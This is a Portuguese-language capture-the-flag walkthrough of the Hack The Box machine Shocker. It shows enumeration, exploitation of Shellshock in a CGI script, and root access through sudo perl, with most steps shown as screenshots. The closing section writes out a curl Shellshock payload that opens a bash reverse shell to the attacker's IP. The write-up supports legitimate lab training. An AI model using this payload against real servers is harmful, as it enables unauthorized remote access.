---
title: "Hack The Box - Shocker"
tags: [Linux,Easy,ShellShock,Metasploit,BurpSuite,Wfuzz]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/108>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas abertas no servidor

> Porta 2222 -> Servidor SSH, dificilmente a exploração vai ser por aqui

> Porta 80 -> Servidor Web


## Enumeração da porta 80

Vimos que é apenas uma página em branco

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_web.png)

### Rodamos o Wfuzz na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_wfuzz.png)

### Encontramos o diretório `/cgi-bin` e rodamos o Wfuzz novamente dentro dele

*/cgi-bin é uma pasta usada no servidor para deixar os scripts que interagem com servidor Web, talvez se encontramos algum script dentro dele .sh podemos fazer Shellshock, possivelmente sim pelo nome da máquina.*

#### Adicionamos a extensão .sh no final do FUZZ

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_wfuzz1.png)

### Baixamos o arquivo user.sh para verificar o que tem nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_user.png)

## Agora vamos verificar se esse script é vulnerável a ShellShock, através do Nmap

### Verificamos estranhamente ele não conseguiu executar comandos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_1.png)

### Vamos dentro do script do Nmap que explora essa vulnerabilidade e vamos tirar o campo cmd, quero que só verifique que se é vulnerável ou não

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_2.png)

### Rodamos novamente sem o cmd e verificamos que é sim vulnerável, contudo não executou nosso comando ls, vamos jogar pra dentro do BurpSuite para verificar melhor como está funcionando essa requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_3.png)

## Abrimos e configuramos o BurpSuite

### Setamos para ele funcionar como um Proxy para nosso servidor Shocker

> Proxy - Options - New

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_burp1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_burp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_burp3.png)

### Rodo o nmap novamente agora redirecionando para nossa porta 8001 no localhost

> O nmap vai redirecionar para a porta 80 do Shocker

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_burp4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_burp5.png)

### Envio a requisição para o Repeater para melhor trabalhar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_burp6.png)

#### Vamos descobrir agora por que não está me dando RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_burp8.png)

Adaptamos o exploit e colocamos o caminho absoluto do binário, ai ele executa

O que está acontecendo de errado é o fato do script rodar como sendo o caminho relativo, por isso não da certo, mas se colocarmos o caminho absoluto do binário ele vai executar normalmente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_burp9.png)

# Exploração

### Pegamos um shell da máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_burp10.png)

### Com o sudo -l verificamos que podemos executar qualquer comando do Perl como se root fosse

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_shelly.png)

# Escalação de Privilégio

### Dentro do `gtfobins` verificamos como escalar privilégio com Perl

> https://gtfobins.github.io/gtfobins/perl/#sudo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_gtfobins.png)

### Viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_r.png)

### Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_r1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_r3.png)

# Com o metasploit

#### Pesquisamos por exploits de shellshock

> search name:shellshock type:exploit platform:linux

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_msf.png)

### Configuramos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_msf1.png)

### Ganhamos o shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_msf2.png)

# Exploraremos agora sem ser pelo Metasploit e de outro modo sem ser o apresentado acima

### Sabemos que a vulnerabilidade do shellshock pode ser explorada nessa máquina, sabendo disso, iremos fazer uma requisição curl para o user.sh

> curl -A '() { :; }; /bin/bash -i > /dev/tcp/10.10.16.119/443 0<&1 2>&1' http://10.10.10.56/cgi-bin/user.sh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-shocker/Shocker_sem.png)